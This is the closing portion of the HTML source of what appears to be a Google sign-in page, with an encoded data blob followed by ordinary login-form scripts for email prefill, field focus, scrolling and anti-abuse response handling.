YoYBNepRqo4rPyp/pZZSZZM8Y2dSBO5Uf+XaywQY4qIPCzlOSmqeuMylnIwnYqYgxtZ5VM6tfyuRu41oKizXfekBoftsDIpbOnSTqF6G2G7L6X+a/hRq611licnKsRBkIFgHj2pXy4yE3QnOwTccremunl04N1c4QI04o1fiwsmNxXDLrRDJTSJQuPwGtrbWiZq16XqMXMSuWdRJFTu6c/BoRdJb1NmpIPDF5EeUK4v/if1YDzf3sbWEkae0I4qDN1jECkh+I4myP4Iatp1W12ehWmFuRbnML36SUjBOAR1wtWn3209Gopiszb/OR3+oceR1KyptOXLjWtaJUoi2uD3qec2eYrwQmGqy4QzR8vXNDO6fhcFTApcNEEWOrw+/RaJ7h70HK8gGA34JTXUl9b/n2Vf7ItUO+mzOft8JFHPmaB7+sSNV+qnfr7OSPgweLDCf32M9J/rraPL7cx8ubjBhgl8Uj4/JcmwvJpQFVB0yBXVj4LVVE5diaavADZ+oG7qP3uNP1r6grCSLE96bjSVyZK0AbRvvhuJQg2axWPCF4NICcQUnXnRhMdX36ZDyVJHqY+uWA+HEeSbpnAT2QDqeO86CPMX6xtPep13T4SjhNgKU2fEfkHb+INWmzMQI4qBfp1s73VGQ7qxuiEnYh4fLK6xQ6O3XHVCLBVUXv3HgYIQf2q6WCz5XCzhrT8/fwmiEuB9V2MT1grbdjzUeedKxV30Y7pVniKiLVzILo3uoYCMPn3/uj59GdxJpXaE1tyWILhUttRtHIv7R/0DBFRyYassnXrFtR6oH7mFRrNQjftuGQAn/6+NyqIXn1VcoN/VCs40oS966f83DXOZ6VWhIGym9xMv3DzopRBJ9CWz1PLFerbi2HWwcc8j3lkLZyu4szmct6C+dCU2aDBzQsITIl2IE5CbK6uYZWEjpFRTBx1FXh679F8nNUo2iRSi5czPAIiXEowFENXoYZWrDAyQbGMmDX3sOh6IkOujO59USj/IHKSs5n7WgpiFUHCNerA/n64Rdd1sCUCg8CHAJzvavDPEjUDjOyERj/7QVA0cOPgLpgZ1MPiI4WCoKslQ58n3YPpA5gucnUTD8meiicVwHY+jFPeTDvE2zu21VQoqKbjbmOfqymf38ApAsXOWTCX3w0SsvwbpCf8prEtAGA9wIMXrV9smCyYecXxnYc3CtzhTxwoa6ccH/mB3zm3r33GGLloTllIdb83mg4GNYMk/Uy3s+ViAWUNZz1bsFIELVYK3EM4W7ySYSc2fO84p8uQksdALo+epWDCcuqbs6USkfWx17lQMtme1yf3pa6i2YtyQ88gwa5ARPnEYn/klbioNgL2Fj/f5fHXxhPj666ToQ5exStZB7Vz2PO+XQEifVA020g0+NU4J4ZvnZXJN45Djcn7wsXTWJGuuhIp0lc6D/iX0bmwXQYFIQZhasfKXCoJJeYE4JotcZW3VJF9Ukj8Ftm30vY+xe06qFqkBzRD1xMxK6d1S5u2MboMX8m7pxtAFcvRxP+t1rLlWMUanWE+IDpiWPqLtBPEDytC2+0U/OndZjdoBHsnwiXCh/DndRFnEWk/0Xij5AMAxOvfNliw1uoJo2bap1Pa1NReAX1ZQzpQxA8GlvQ4sqwd44Xpgwb6eH2i5gCkN45T7Z2swGPNZNxov1PGVONPVQWCpANbhqpdnJfgKD/g9RD1POQ7rguEP4Z4/mu02hS0W5E84uoXIVMzTaIC5mczDi79PTie6oApeF/pVnRfg0DQhLNCkNb97k2lGEDjpa2lHZH6rqUPlx8xTFUNDX5gM2B1bfLthyNkz6vLt/yH/dwfBnQf0wHQ0I/rCZauGEAdTAA4NrGP04BSd+TZZRsGpCfzEsaQFBn7pfIW59sEO6NkCZY2YgHT+WOXP4IFyILfIZFj/Qxwgx+/Q7yfg==');
  </script>
<script>
  function gaia_parseFragment() {
  var hash = location.hash;
  var params = {};
  if (!hash) {
  return params;
  }
  var paramStrs = decodeURIComponent(hash.substring(1)).split('&');
  for (var i = 0; i < paramStrs.length; i++) {
      var param = paramStrs[i].split('=');
      params[param[0]] = param[1];
    }
    return params;
  }

  function gaia_prefillEmail() {
    var form = null;
    if (document.getElementById) {
      form = document.getElementById('gaia_loginform');
    }

    if (form && form.Email &&
        (form.Email.value == null || form.Email.value == '')
        && (form.Email.type != 'hidden')) {
      hashParams = gaia_parseFragment();
      if (hashParams['Email'] && hashParams['Email'] != '') {
        form.Email.value = hashParams['Email'];
      }
    }
  }

  
  try {
    gaia_prefillEmail();
  } catch (e) {
  }
  
</script>
<script>
  function gaia_setFocus() {
  var form = null;
  var isFocusableField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  if (inputElement.type != 'hidden' && inputElement.focus &&
  inputElement.style.display != 'none') {
  return true;
  }
  return false;
  };
  var isFocusableErrorField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  var hasError = inputElement.className.indexOf('form-error') > -1;
  if (hasError && isFocusableField(inputElement)) {
  return true;
  }
  return false;
  };
  var isFocusableEmptyField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  var isEmpty = inputElement.value == null || inputElement.value == '';
  if (isEmpty && isFocusableField(inputElement)) {
  return true;
  }
  return false;
  };
  if (document.getElementById) {
  form = document.getElementById('gaia_loginform');
  }
  if (form) {
  var userAgent = navigator.userAgent.toLowerCase();
  var formFields = form.getElementsByTagName('input');
  for (var i = 0; i < formFields.length; i++) {
        var currentField = formFields[i];
        if (isFocusableErrorField(currentField)) {
          currentField.focus();
          
          var currentValue = currentField.value;
          currentField.value = '';
          currentField.value = currentValue;
          return;
        }
      }
      
      
      
        for (var j = 0; j < formFields.length; j++) {
          var currentField = formFields[j];
          if (isFocusableEmptyField(currentField)) {
            currentField.focus();
            return;
          }
        }
      
    }
  }

  
  if (!('ontouchstart' in window)) {
    gaia_attachEvent(window, 'load', gaia_setFocus);
  }
  
</script>
<script>
  var gaia_scrollToElement = function(element) {
  var calculateOffsetHeight = function(element) {
  var curtop = 0;
  if (element.offsetParent) {
  while (element) {
  curtop += element.offsetTop;
  element = element.offsetParent;
  }
  }
  return curtop;
  }
  var siginOffsetHeight = calculateOffsetHeight(element);
  var scrollHeight = siginOffsetHeight - window.innerHeight +
  element.clientHeight + 0.02 * window.innerHeight;
  window.scroll(0, scrollHeight);
  }
</script>
<script>
  (function(){
  var signinInput = document.getElementById('signIn');
  gaia_onLoginSubmit = function() {
  try {
  document.bg.invoke(function(response) {
  document.getElementById('bgresponse').value = response;
  });
  } catch (err) {
  document.getElementById('bgresponse').value = '';
  }
  return true;
  }
  document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;
  var signinButton = document.getElementById('signIn');
  gaia_attachEvent(window, 'load', function(){
  gaia_scrollToElement(signinButton);
  });
  })();
</script>
  </body>
</html>